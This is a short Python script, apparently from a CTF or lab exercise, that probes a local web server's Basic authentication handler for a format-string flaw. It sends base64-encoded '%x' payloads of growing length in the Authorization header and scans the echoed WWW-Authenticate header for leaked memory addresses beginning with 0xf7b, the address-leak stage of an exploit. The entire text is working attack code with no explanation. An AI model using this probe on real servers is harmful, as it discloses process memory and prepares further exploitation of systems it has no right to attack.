#!/usr/bin/python

import requests
import base64

from requests.api import post

url = 'http://127.0.0.1:8000/ultimate.html'


def prepare_message(message):
	message_bytes = message.encode('ascii')
	base64_bytes = base64.b64encode(message_bytes)
	headers = {
		'Authorization': 'Basic '+base64_bytes.decode()
	}
	return headers

for i in range(1,1000):
    #get post_data address
    headers = prepare_message("%x "*i)
    r = requests.post(url , headers=headers )
    post_data_string = r.headers['WWW-Authenticate']
    post_data_tokens = post_data_string.split(sep=" ")
    post_data = "0x" + post_data_tokens[-2]
    if post_data.startswith("0xf7b"):
        print(str(i)+" "+post_data)